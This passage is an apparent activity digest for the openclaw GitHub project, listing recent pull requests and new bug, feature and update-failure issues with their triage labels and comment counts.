- [#204322](https://github.com/openclaw/openclaw/pull/204322) fix: finish early Git checkout updates automatically instead of asking for a rebuild
- [#204725](https://github.com/openclaw/openclaw/pull/204725) refactor(test): consolidate OAuth paste rejection coverage
- [#203292](https://github.com/openclaw/openclaw/pull/203292) fix: let agents on a dedicated worker start child sessions
- [#204728](https://github.com/openclaw/openclaw/pull/204728) fix(ci): keep Beam implementation exports private
- [#204160](https://github.com/openclaw/openclaw/pull/204160) fix: deliver images sent during a Claude CLI turn instead of queueing them
- [#204702](https://github.com/openclaw/openclaw/pull/204702) fix(state): name the owner that revoked a session reader's receipt
- [#204664](https://github.com/openclaw/openclaw/pull/204664) ci(performance): keep npm debug logs with the Kova lane report
- [#204719](https://github.com/openclaw/openclaw/pull/204719) fix(test): isolate scoped cursor encoding rejection
- [#204724](https://github.com/openclaw/openclaw/pull/204724) fix(qa-channel): read envelope timestamps through the channel runtime
- [#204718](https://github.com/openclaw/openclaw/pull/204718) fix(ci): stabilize macOS recovery and PR cache fixtures
- [#204723](https://github.com/openclaw/openclaw/pull/204723) test(logging): prove in-flight rescue at the native append boundary
- [#204721](https://github.com/openclaw/openclaw/pull/204721) fix(test): keep GPT-Live stall proof on loopback
- [#204710](https://github.com/openclaw/openclaw/pull/204710) fix(test): detect shared catalog relation query regressions

#### 🐛 New Issues
- [#204775](https://github.com/openclaw/openclaw/issues/204775) Design: prepared-release updates (state, ownership and plan) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `issue-rating: 🌊 off-meta tidepool` 💬12
- [#204931](https://github.com/openclaw/openclaw/issues/204931) [Bug] Typed /stop on chat/CLI lane queues behind an active run instead of aborting it `P1` `clawsweeper:needs-live-repro` `issue-rating: 🐚 platinum hermit` `impact:ux-friction` 💬5
- [#204933](https://github.com/openclaw/openclaw/issues/204933) [Bug]: OpenAI gateway-relay Talk finalizes transcripts that never appear in the conversation `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `impact:auth-provider` 💬5
- [#204816](https://github.com/openclaw/openclaw/issues/204816) [Bug]: 2026.11.4 → 2026.11.8 stable rolls back with doctor-failed / Invalid config after successful candidate validation `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `issue-rating: 🦪 silver shellfish` 💬5
- [#205007](https://github.com/openclaw/openclaw/issues/205007) My device is being completely overtaken, can't get into my accounts. Found BSD license GO wrote?Allows people to do the complete take over no consequences no reverse except 1 possible below through Microsoft,the counter to stop it. go1.27.4src/os/exec/lookpath.go lp_windows_test.goread3.golookpath.go // Copyright 2026 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-security-review` `clawsweeper:needs-info` 💬4
- [#204704](https://github.com/openclaw/openclaw/issues/204704) [Bug]: Windows Scheduled Task restart and health CLI keep waiting after a resident Gateway trial commits `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:linked-pr-open` `clawsweeper:needs-live-repro` 💬3
- [#204982](https://github.com/openclaw/openclaw/issues/204982) Pending fixed-choice harness question rejects every non-matching chat reply, locking the session until resolved out of band `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:fix-shape-clear` `clawsweeper:needs-maintainer-review` 💬3
- [#204735](https://github.com/openclaw/openclaw/issues/204735) [Bug]: macOS service refresh deadlocks when existing PATH[0] is not dirname(node) (SERVICE_DEFINITION_UNKNOWN since >=2026.9.7, surfaced as owed step in beta.3) `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬3
- [#204744](https://github.com/openclaw/openclaw/issues/204744) Per-turn chat-send overhead: snapshot phase bimodal (2-35 ms vs ~1.2 s), plus 360 ms of Docker chatter per turn `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `issue-rating: 🦪 silver shellfish` 💬3
- [#204737](https://github.com/openclaw/openclaw/issues/204737) [Bug]: Skill Workshop daily maintenance aborts before its skip handler on learned skills with root-level support files (diet, undo and restore all fail) `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬3
- [#204818](https://github.com/openclaw/openclaw/issues/204818) Fast-track approval request: openclaw v2026.11.9 (321f1106) `issue-rating: 🌊 off-meta tidepool` 💬3
- [#205076](https://github.com/openclaw/openclaw/issues/205076) [Bug]: Scheduled jobs stop doing work and repeatedly send errors when one OpenAI account hits its quota `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬2
- [#204905](https://github.com/openclaw/openclaw/issues/204905) [Bug]: efficient browser snapshots (and navigate page state) miss controls on deep pages: wrapper divs count toward depth 6 `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:source-repro` `clawsweeper:linked-pr-open` 💬2
- [#204651](https://github.com/openclaw/openclaw/issues/204651) [Bug]: Control UI chat cannot reply after sessions_yield — completion source reply refused 'require an authoritative current conversation' (visibleReplies: message_tool) `no-stale` `P1` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬2
- [#205006](https://github.com/openclaw/openclaw/issues/205006) [Bug]: Sessions end silently when the model emits OpenClaw-style tool-call text without structured tool_calls (regression in 2026.11.7) `no-stale` `P1` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬2
- [#204952](https://github.com/openclaw/openclaw/issues/204952) [Bug]: Async provider discovery and auth preparation can synchronously stall the Gateway event loop (Windows beta.3) `no-stale` `P1` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬2
- [#204681](https://github.com/openclaw/openclaw/issues/204681) Update failure: package-backup-retention (2026.11.8) `P2` `clawsweeper:needs-info` `issue-rating: 🦪 silver shellfish` `impact:ux-friction` 💬2
- [#204846](https://github.com/openclaw/openclaw/issues/204846) codex: question prompt escaping mangles URLs on text-fallback channels (_ -> U+FF3F, \n -> ?), user can't complete Browser step `no-stale` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` `clawsweeper:source-repro` 💬2
- [#204875](https://github.com/openclaw/openclaw/issues/204875) [Bug]: memory-wiki Related Pages treats shared source pages as relatedness; omnibus daily notes cross-link ~20 unrelated pages (fan-out cap 24) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬2
- [#204738](https://github.com/openclaw/openclaw/issues/204738) [Bug]: core/doctor/memory-provenance reports a fix-now MEMORY.md quarantine, but there is no way to restore trust after review `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:needs-security-review` 💬2
- [#204767](https://github.com/openclaw/openclaw/issues/204767) [Bug]: Exec-completion wake in a webchat gateway-owner session runs with runtime senderIsOwner=false, quarantining MEMORY.md on tracked edits `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:needs-security-review` 💬2
- [#204736](https://github.com/openclaw/openclaw/issues/204736) [Bug]: Update summary counts a completed deferred model-retirement repair as a warning that needs attention `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:source-repro` `clawsweeper:linked-pr-open` 💬2
- [#204771](https://github.com/openclaw/openclaw/issues/204771) [Bug]: Tool-call argument buffer overflow (256KB, OpenAI-completions transport) is misclassified as context overflow, surfacing misleading auto-compaction-failure message `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:linked-pr-open` `issue-rating: 🦪 silver shellfish` 💬2
- [#204826](https://github.com/openclaw/openclaw/issues/204826) Control UI: share the fixed runtime-config projection read contract `P3` `issue-rating: 🌊 off-meta tidepool` 💬2
- [#204811](https://github.com/openclaw/openclaw/issues/204811) Automatic Haiku utility calls fall back cross-provider without observable same-provider rotation `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬2
- [#204819](https://github.com/openclaw/openclaw/issues/204819) Control UI: qualify one mounted packaged-settings lifecycle owner `P3` `issue-rating: 🌊 off-meta tidepool` 💬2
- [#204812](https://github.com/openclaw/openclaw/issues/204812) Control UI: qualify narrow Appearance and Notifications presentation contracts `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `issue-rating: 🌊 off-meta tidepool` 💬2
- [#204494](https://github.com/openclaw/openclaw/issues/204494) Gateway RSS grows to 4-5GB in 1-2 hours: 3.6GB of exactly-256KB anonymous rw mappings (JS heap flat, native allocator leak) `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-info` 💬2
- [#204795](https://github.com/openclaw/openclaw/issues/204795) Control UI: qualify canonical overlay ownership for the Inbox panel `P3` `issue-rating: 🌊 off-meta tidepool` 💬2
- [#204791](https://github.com/openclaw/openclaw/issues/204791) Control UI: qualify shared cold and ready Settings sidebar framing `P3` `issue-rating: 🌊 off-meta tidepool` 💬2
- [#204697](https://github.com/openclaw/openclaw/issues/204697) Use the shared cloud-worker config owner for profile editing `P3` `issue-rating: 🌊 off-meta tidepool` 💬2
- [#204712](https://github.com/openclaw/openclaw/issues/204712) Skill Workshop output is silently discarded by the skills prompt budget, and `openclaw skills check` cannot report it `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:source-repro` 💬2
- [#204682](https://github.com/openclaw/openclaw/issues/204682) [Bug]: Automatic goal continuation never fires on the `openclaw` harness — `continuationTurns` stays 0 across four sessions `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `impact:session-state` 💬2
- [#204689](https://github.com/openclaw/openclaw/issues/204689) [Bug]: Tool Search directory mode hydrates deferred tools mid-run, busting the prefix cache on providers that render tools first (vLLM/Qwen) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-info` 💬2
- [#204694](https://github.com/openclaw/openclaw/issues/204694) Qualify a stable Knowledge Browse renderer under one UI owner `P3` `issue-rating: 🌊 off-meta tidepool` 💬2
- [#204425](https://github.com/openclaw/openclaw/issues/204425) Web UI shows only 1 agent while CLI lists 3 - agent DB admission broken since 11.4->11.5 upgrade (update-recovery-pending) `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-info` 💬2
- [#204630](https://github.com/openclaw/openclaw/issues/204630) [Bug]: Live transcript update for scheduled-run sessions fails with "Cron job names need refresh; await prepareCronJobNameResolver" `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬2
- [#204658](https://github.com/openclaw/openclaw/issues/204658) Keep one command-palette input through lazy capability loading `P3` `issue-rating: 🌊 off-meta tidepool` 💬2
- [#204639](https://github.com/openclaw/openclaw/issues/204639) [Bug]: Codex harness posts images the agent only inspected, even on NO_REPLY `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:needs-security-review` 💬2
- [#204634](https://github.com/openclaw/openclaw/issues/204634) Gateway child survives with no listening socket after failed shutdown; cleanup abandons on coordination-channel errors (cancel-write EPIPE inside kill()) `P1` `impact:crash-loop` `maturity:stable` 💬2
- [#204612](https://github.com/openclaw/openclaw/issues/204612) database port --rollback fails with OWNER_UNAVAILABLE after a completed port (state sqlite replaced by anchor stub) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-live-repro` 💬2
- [#204611](https://github.com/openclaw/openclaw/issues/204611) Gateway fails to start when shared state is on PostgreSQL: secrets activation opens the PG store synchronously on the main thread `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-info` 💬2
- [#205098](https://github.com/openclaw/openclaw/issues/205098) [Bug]: Fresh Terminal page leaves the current shell out of the sessions picker `clawsweeper:intake:bug` 💬1
- [#205095](https://github.com/openclaw/openclaw/issues/205095) Docker activation can report SIGTERM exit 143 after Doctor has already reported a final validation error `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:source-repro` 💬1
- [#204923](https://github.com/openclaw/openclaw/issues/204923) [Bug]: Sidebar New session stays disabled after the Gateway connects `P2` `clawsweeper:source-repro` `issue-rating: 🦞 diamond lobster` `impact:ux-friction` 💬1
- [#205087](https://github.com/openclaw/openclaw/issues/205087) Gateway can report startup failure after a clean SIGTERM stop during deferred model publication `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#205077](https://github.com/openclaw/openclaw/issues/205077) [Bug]: Simultaneous first visits with a Gateway token return one tab to sign-in `P2` `clawsweeper:source-repro` `issue-rating: 🦞 diamond lobster` `impact:ux-friction` 💬1
- [#205074](https://github.com/openclaw/openclaw/issues/205074) pre-bootstrap process tests fail on macOS: spoofed Linux platform reads the real /proc/self/mountinfo `P2` `clawsweeper:source-repro` `issue-rating: 🦞 diamond lobster` 💬1
- [#205072](https://github.com/openclaw/openclaw/issues/205072) [Feature]: The best versioning scheme is the X.Y.Z format, such as 2.0.12！！！ `enhancement` `P3` 💬1
- [#205063](https://github.com/openclaw/openclaw/issues/205063) [Bug]: Caps Lock makes chat composer Redo undo again after selecting a person `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:source-repro` `clawsweeper:linked-pr-open` 💬1
- [#205064](https://github.com/openclaw/openclaw/issues/205064) [Feature]: Configurable resolution/quality for computer-tool screenshots (hard-coded 1280 px / JPEG 0.85 cap) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:fix-shape-clear` `clawsweeper:needs-maintainer-review` 💬1
- [#204836](https://github.com/openclaw/openclaw/issues/204836) [Bug]: pnpm: `openclaw update` to 2026.11.7, 2026.11.8 or 2026.11.9 leaves the command broken and the Gateway stopped `P1` `impact:crash-loop` `clawsweeper:not-repro-on-main` `issue-rating: 🦪 silver shellfish` 💬1
- [#205055](https://github.com/openclaw/openclaw/issues/205055) [Bug]: Live plugin side questions merge into the parent request on Chat Completions `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:source-repro` `clawsweeper:linked-pr-open` 💬1
- [#205035](https://github.com/openclaw/openclaw/issues/205035) Windows TEMP service repair retains control SQLite custody and fails Gateway publication (EPERM) `P1` `clawsweeper:source-repro` `impact:crash-loop` `issue-rating: 🦞 diamond lobster` 💬1
- [#204746](https://github.com/openclaw/openclaw/issues/204746) [Bug]: memory-core dreaming drops the Dream Diary entry when the REM-phase ingestion evicts light-staged rows from a full recall store `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#205040](https://github.com/openclaw/openclaw/issues/205040) [Bug]: transcript_events column order + non-covering PK forces readTranscriptStatsBatchFromDatabase (and MAX(created_at)) to read 100% of overflow payload pages (538x read amplification) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:fix-shape-clear` `clawsweeper:needs-maintainer-review` 💬1
- [#205033](https://github.com/openclaw/openclaw/issues/205033) [UX]: Explain explicit load-path shadowing when plugin maintenance rejects package-owner metadata `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#205038](https://github.com/openclaw/openclaw/issues/205038) [Docs/UX]: Surface local artifact format and SHA-256 contract before plugin activation approval `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-live-repro` 💬1
- [#205032](https://github.com/openclaw/openclaw/issues/205032) [Docs/API]: Distinguish agent memory_search/get from the selected provider Gateway interface `no-stale` `P3` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#205034](https://github.com/openclaw/openclaw/issues/205034) [Feature]: Durable owner-action blockers and notification coalescing across scheduled agent runs `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#205031](https://github.com/openclaw/openclaw/issues/205031) Update failure: [redacted-command] (2026.9.4) `P2` `clawsweeper:needs-info` `issue-rating: 🦪 silver shellfish` `impact:ux-friction` 💬1
- [#205021](https://github.com/openclaw/openclaw/issues/205021) [Bug]: Reordering AGENTS.md sections never reaches existing chats `P2` `clawsweeper:source-repro` `impact:session-state` `issue-rating: 🦞 diamond lobster` 💬1
- [#204834](https://github.com/openclaw/openclaw/issues/204834) [Bug]: Update to 2026.11.8 blocked: Doctor `session.import.batch` refuses valid cold transcripts (TRANSCRIPT_COLD) instead of restoring or skipping them `no-stale` `P1` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#205001](https://github.com/openclaw/openclaw/issues/205001) channels dead-letters: --channel with mixed case or a bundled alias reads an empty queue and hides failed events `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#205000](https://github.com/openclaw/openclaw/issues/205000) mcp: openclaw-tools bridge ignores tools.deny, agent tools.deny, and profile for ACP sessions `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-security-review` `clawsweeper:source-repro` 💬1
- [#204997](https://github.com/openclaw/openclaw/issues/204997) whatsapp: security audit --fix seeds every account's groupAllowFrom from the default account's pairing store `security` `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-security-review` 💬1
- [#204996](https://github.com/openclaw/openclaw/issues/204996) models CLI: fallbacks list and image-fallbacks list ignore --agent and print global defaults `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204995](https://github.com/openclaw/openclaw/issues/204995) sessions tail: unqualified or mixed-case --session-key (main, Agent:Main:Main) fails instead of tailing agent:main:main `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204999](https://github.com/openclaw/openclaw/issues/204999) Signal: blockquote continuation lines, nested quote lines, and later chunks lose the > marker `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204993](https://github.com/openclaw/openclaw/issues/204993) gateway: agents.delete reports UNAVAILABLE and skips cleanup for mixed-case roster keys `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204998](https://github.com/openclaw/openclaw/issues/204998) agents: sessions tool cannot clear a thinking override (thinkingLevel default/inherit/reset rejected as invalid) `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204994](https://github.com/openclaw/openclaw/issues/204994) exec-policy show: mixed-case agents.entries key splits one agent into two policy scopes and understates its ask policy `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204991](https://github.com/openclaw/openclaw/issues/204991) hooks: mapping templates drop mixed-case header references like {{headers.X-GitHub-Event}} `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204992](https://github.com/openclaw/openclaw/issues/204992) amazon-bedrock: configured params.topP / top_p is never sent in Converse inferenceConfig `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204981](https://github.com/openclaw/openclaw/issues/204981) Update failure: global-install-failed (2026.9.4) `P2` `clawsweeper:needs-info` `issue-rating: 🦪 silver shellfish` `impact:ux-friction` 💬1
- [#204975](https://github.com/openclaw/openclaw/issues/204975) Update failure: gateway-recovery-verification (2026.10.7) `P2` `issue-rating: 🦪 silver shellfish` `impact:ux-friction` 💬1
- [#204940](https://github.com/openclaw/openclaw/issues/204940) [Bug]: Conversation Versions and session previews show stray backticks after linked inline code `bug` `no-stale` `P2` `clawsweeper:fix-shape-clear` 💬1
- [#204939](https://github.com/openclaw/openclaw/issues/204939) [Bug]: Mattermost file caption chunks split a named Markdown link across posts `bug` `no-stale` `P2` `clawsweeper:fix-shape-clear` 💬1
- [#204902](https://github.com/openclaw/openclaw/issues/204902) [Bug]: Fresh Knowledge chat fails context precheck with direct tool schemas `bug` `P2` `impact:message-loss` `issue-rating: 🦪 silver shellfish` 💬1
- [#204970](https://github.com/openclaw/openclaw/issues/204970) sessions search cannot reach cold transcripts, and the exclusion is enforced three ways `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204968](https://github.com/openclaw/openclaw/issues/204968) Doctor keeps reporting historical_transcript_deferred for archive-tier copies that no longer exist (2026.11.8), with no way to acknowledge them `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:fix-shape-clear` `clawsweeper:needs-maintainer-review` 💬1
- [#204966](https://github.com/openclaw/openclaw/issues/204966) Provider usage: no Anthropic usage windows when Claude is authenticated via the claude-cli runtime `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:source-repro` 💬1
- [#204964](https://github.com/openclaw/openclaw/issues/204964) Node exec: gateway matches the node allowlist against its own filesystem's realpath (`/bin/date` misses in a Debian container where `/bin` → `usr/bin`) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-security-review` `clawsweeper:source-repro` 💬1
- [#204895](https://github.com/openclaw/openclaw/issues/204895) [Feature]: Google Cloud Storage provider for storage locations (`gcs`) `P3` 💬1
- [#204880](https://github.com/openclaw/openclaw/issues/204880) feat: allow rollbacks across compatible database schema changes `P2` `clawsweeper:source-repro` `issue-rating: 🦞 diamond lobster` 💬1
- [#204884](https://github.com/openclaw/openclaw/issues/204884) `agent exec --json` reports `costUsd: 0` for a custom model with no configured price `P2` `clawsweeper:source-repro` `issue-rating: 🦞 diamond lobster` `impact:other` 💬1
- [#204892](https://github.com/openclaw/openclaw/issues/204892) [Bug]: Valid $include blocks first Gateway start after upgrade from 2026.11.7 `bug` `P1` `clawsweeper:source-repro` `impact:crash-loop` 💬1
- [#204891](https://github.com/openclaw/openclaw/issues/204891) [Bug]: PostgreSQL-backed Gateway accepts concurrent first chat turns that never reach the model `bug` `P1` `impact:session-state` `issue-rating: 🦪 silver shellfish` 💬1
- [#204945](https://github.com/openclaw/openclaw/issues/204945) [Bug]: Codex supervision cannot locate threads in their originating history home `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-live-repro` 💬1
- [#204944](https://github.com/openclaw/openclaw/issues/204944) Control UI usage-page widget shows "Re-login needed" on rate-limit (429), not just auth failure 💬1
- [#204893](https://github.com/openclaw/openclaw/issues/204893) [Bug]: First Gateway start after upgrade exits on ext4 lost+found in the state directory `bug` `P1` `clawsweeper:source-repro` `impact:crash-loop` 💬1
- [#204941](https://github.com/openclaw/openclaw/issues/204941) Update failure: package-update (2026.11.1) `P2` `clawsweeper:needs-info` `issue-rating: 🦪 silver shellfish` `impact:ux-friction` 💬1
- [#204936](https://github.com/openclaw/openclaw/issues/204936) [Bug]: `infer model run` trims prompt whitespace on the default Gateway route `bug` `no-stale` `P2` `clawsweeper:fix-shape-clear` 💬1
- [#204935](https://github.com/openclaw/openclaw/issues/204935) [Bug]: `infer model run` fails on literal `HEARTBEAT_OK` and `NO_REPLY` replies through the Gateway `bug` `P2` `clawsweeper:source-repro` `issue-rating: 🦞 diamond lobster` 💬1
- [#204937](https://github.com/openclaw/openclaw/issues/204937) [Feature]: Make Parallel Search API mode configurable for the parallel web_search provider `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204903](https://github.com/openclaw/openclaw/issues/204903) [Bug]: Worktrees branch picker keeps parent branches after git init in a subfolder `bug` `no-stale` `P2` `clawsweeper:fix-shape-clear` 💬1
- [#204930](https://github.com/openclaw/openclaw/issues/204930) [Bug]: `codex_plugins` is exposed in chats that do not use the Codex harness `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:source-repro` 💬1
- [#204926](https://github.com/openclaw/openclaw/issues/204926) [Bug]: xAI OAuth catalog shows Auth: No for Grok 4.7 despite successful direct inference `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `impact:auth-provider` 💬1
- [#204897](https://github.com/openclaw/openclaw/issues/204897) [Bug]: Sign in with ChatGPT requests from isolated cron runs fall back for minutes after Gateway startup (OAUTH_PROVIDER_CONFIGURED_UNAVAILABLE, fallback reason=unknown) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-info` 💬1
- [#204889](https://github.com/openclaw/openclaw/issues/204889) [Bug]: Gateway stop waits out the whole stop budget, then SIGKILL, when a native service-child anchor stops answering (claude-cli) `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:source-repro` 💬1
- [#204878](https://github.com/openclaw/openclaw/issues/204878) [Bug]: Silent main-session heartbeats accumulate in model context after migration to cron automations `bug` `regression` `P2` `clawsweeper:no-new-fix-pr` 💬1
- [#204870](https://github.com/openclaw/openclaw/issues/204870) [Feature]: claude-cli: expose a running first turn's native session id (transcript) before the turn settles `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204768](https://github.com/openclaw/openclaw/issues/204768) [Bug]: Update run record (16 KiB steps_json) silently evicts actionable warnings: 2026.11.7 hid a failed service refresh, beta.3 status drops a real Doctor warning `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:source-repro` 💬1
- [#204769](https://github.com/openclaw/openclaw/issues/204769) [Bug]: doctor --lint --all reports a false core/doctor/device-pairing "Client credential migration is incomplete or stale" (reads the isolated state snapshot) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:source-repro` `clawsweeper:linked-pr-open` 💬1
- [#204850](https://github.com/openclaw/openclaw/issues/204850) Use Gateway review and GitHub tools in managed sandboxes `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204854](https://github.com/openclaw/openclaw/issues/204854) sessions_send: exact-key lookup miss in A2A origin is indistinguishable from a missing session `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:needs-security-review` 💬1
- [#204842](https://github.com/openclaw/openclaw/issues/204842) claude-cli managed live session: resumed turn fails with cli_live_session_changed instead of restarting, and the failure puts the auth profile into cooldown `P1` `clawsweeper:needs-live-repro` `impact:session-state` `impact:auth-provider` 💬1
- [#204839](https://github.com/openclaw/openclaw/issues/204839) [Bug]: Codex follow-ups fail while workers hold a thread with a symlinked home `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:source-repro` `clawsweeper:linked-pr-open` 💬1
- [#204838](https://github.com/openclaw/openclaw/issues/204838) path emit reports a temporary copy of a JSON file as Markdown `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:source-repro` `clawsweeper:linked-pr-open` 💬1
- [#204824](https://github.com/openclaw/openclaw/issues/204824) Gateway-wide steer-first delivery for agent coordination and subagent results `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204828](https://github.com/openclaw/openclaw/issues/204828) [Bug]: OpenClaw updater fails during candidate-state-snapshot with too many SQL variables `bug` `bug:crash` `P2` `clawsweeper:needs-info` 💬1
- [#204821](https://github.com/openclaw/openclaw/issues/204821) [Consulta]: autenticación protegida para clientes externos del Gateway `P3` 💬1
- [#204766](https://github.com/openclaw/openclaw/issues/204766) Startup safety refusal restarts the gateway in silence for hours (no alert, no surfaced exit) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204765](https://github.com/openclaw/openclaw/issues/204765) Upgrade 2026.11.3 -> 2026.11.6 drops tools.media.image.models (media understanding silently unpinned) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-security-review` `clawsweeper:needs-info` 💬1
- [#204649](https://github.com/openclaw/openclaw/issues/204649) test: subagent-registry.requester-wake.e2e 'settles requester receipts' cases time out at 120 s `P2` `issue-rating: 🦪 silver shellfish` `impact:other` 💬1
- [#204745](https://github.com/openclaw/openclaw/issues/204745) [Bug]: Doctor says memory is missing in an existing workspace with working plugin-backed memory `no-stale` `P3` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204740](https://github.com/openclaw/openclaw/issues/204740) [Bug]: Android notification updates with the same key are each queued as a new event, so one ongoing notification wakes the agent repeatedly `P2` `impact:session-state` 💬1
- [#204731](https://github.com/openclaw/openclaw/issues/204731) [Bug]: Doctor recommends initializing databases for disabled plugins `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204730](https://github.com/openclaw/openclaw/issues/204730) CI: server-database-engine-cron.postgres restart test gets 503 intermittently `P2` `issue-rating: 🦪 silver shellfish` `impact:other` 💬1
- [#204708](https://github.com/openclaw/openclaw/issues/204708) Chat snapshot cache (IndexedDB) has no content-level invalidation → unresponsive Control UI tab after out-of-band transcript row deletion `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `impact:session-state` 💬1
- [#204701](https://github.com/openclaw/openclaw/issues/204701) backup git create: configurable git timeout + table-level exclusions (hardcoded 120s GIT_TIMEOUT_MS causes recurring scheduled-backup failures) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204659](https://github.com/openclaw/openclaw/issues/204659) Consolidate primary and managed session-list request lifecycle ownership `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `issue-rating: 🌊 off-meta tidepool` 💬1
- [#204679](https://github.com/openclaw/openclaw/issues/204679) [Bug]: `update status` labels retained update captures "unreadable" with unnamed, inconsistent reasons and a circular next action `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
